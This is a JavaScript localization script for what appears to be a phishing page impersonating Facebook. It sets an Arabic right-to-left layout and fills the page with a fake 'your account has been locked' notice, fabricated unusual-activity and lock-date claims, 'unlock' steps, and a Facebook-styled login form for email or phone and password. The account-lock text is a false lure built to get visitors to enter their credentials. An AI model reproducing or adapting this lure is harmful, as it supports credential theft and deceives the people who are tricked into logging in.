document.getElementsByTagName("body")[0].style.direction = "rtl";
document.querySelector(".borderline").style.cssText = `border-left: none;border-right: 2px solid #e4e6eb; margin-left: 0%;margin-right: 7%;`;
document.querySelector(".home-bullet-box").style.cssText = `margin-left:0;margin-right: -37px;`;
document.querySelector(".home-s-line .home-bullet-box").style.cssText = `margin-left:0;margin-right: -37px;`;
document.querySelector(".home-t-line .home-bullet-box").style.cssText = `margin-left:0;margin-right: -37px;`;
document.querySelector(".home-container1 .logo").style.cssText = `margin-right: 20px;`;
var mq = window.matchMedia( "(max-width: 570px)" );
if (mq.matches) {
   document.querySelector(".home-bullet-box").style.cssText = `margin-left:0;margin-right: -26px;`
   document.querySelector(".home-s-line .home-bullet-box").style.cssText = `margin-left:0;margin-right: -26px;`;
	document.querySelector(".home-t-line .home-bullet-box").style.cssText = `margin-left:0;margin-right: -26px;`;
}

var mainHeader = document.querySelector(".home-main-header .home-heading");
var mainParagraph = document.querySelector(".home-mainparagrph .home-text");
var lockedHeader = document.querySelector(".home-lockedheader .home-text1");
var lockedParagraph = document.querySelector(".home-lockedinfobox .home-container6 .home-text5");
var footerParagraph = document.querySelector(".home-main-card .home-container7 .home-text6");
var getStarted = document.querySelector(".home-main-card .home-link");
var nextHeader = document.querySelector(".home-next-card .home-unlock-header .home-text");
var fristLineHeader = document.querySelector(".home-f-line .home-text03");
var fristLineParagraph = document.querySelector(".home-f-line .home-text05 span"); 
var secoundLineHeader = document.querySelector(".home-s-line .home-text09"); 
var thirdLineHeader = document.querySelector(".home-t-line .home-text12"); 
var nextButton = document.querySelector(".home-next-buttons .home-button1");
var backButton = document.querySelector(".home-next-buttons .home-button");
var logHeading = document.querySelector(".home-log-card .dlog .home-heading");
var logAlert = document.querySelector(".home-log-card .home-alert");
var logAlert2 = document.getElementById("alert");
var userInput = document.querySelector(".home-mail");
var passInput = document.querySelector(".home-pass");
var logButton = document.querySelector(".home-submit"); 
var or = document.querySelector(".home-or");
var createButton = document.querySelector(".home-creat-new");


mainHeader.innerHTML ="تم قفل حسابك";
mainParagraph.innerHTML ="لقد رأينا نشاطًا غير عادي في حسابك. قد يعني هذا أن شخصًا ما قد استخدم حسابك دون علمك.";
lockedHeader.innerHTML ="تم إغلاق الحساب في 10 نوفمبر 2021";
lockedParagraph.innerHTML ="لحمايتك ، ملفك الشخصي غير مرئي للأشخاص على Facebook ولا يمكنك استخدام حسابك.";
footerParagraph.innerHTML ="سنوجهك عبر بعض الخطوات لفتح حسابك.";
getStarted.innerHTML ="بدء الاستخدام";
nextHeader.innerHTML ="كيف تفتح حسابك";
fristLineHeader.innerHTML ="تأكيد أن هذا حسابك";
fristLineParagraph.innerHTML ="نظرًا لاحتمال حصول شخص آخر على إمكانية الوصول لحسابك ، نحتاج إلى تأكيد أنك مالك هذا الحساب قبل أن نتخذ اي اجراء اخر.";
secoundLineHeader.innerHTML ="تأمين تفاصيل تسجيل الدخول الخاصة بك";
thirdLineHeader.innerHTML ="سيتم فتح حسابك";
nextButton.innerHTML ="التالي";
backButton.innerHTML ="الخلف";
logHeading.innerHTML ="تسجيل الدخول إلى الفيسبوك";
logAlert.innerHTML ="يجب تسجيل الدخول اولا";
logAlert2.innerHTML ="يجب تسجيل الدخول اولا";
userInput.setAttribute("placeholder" , "عنوان البريد الإلكتروني أو رقم الهاتف");
passInput.setAttribute("placeholder" , "كلمه السر");
logButton.innerHTML ="تسجيل دخول";
or.innerHTML ="أو";
createButton.innerHTML ="انشاء حساب جديد";
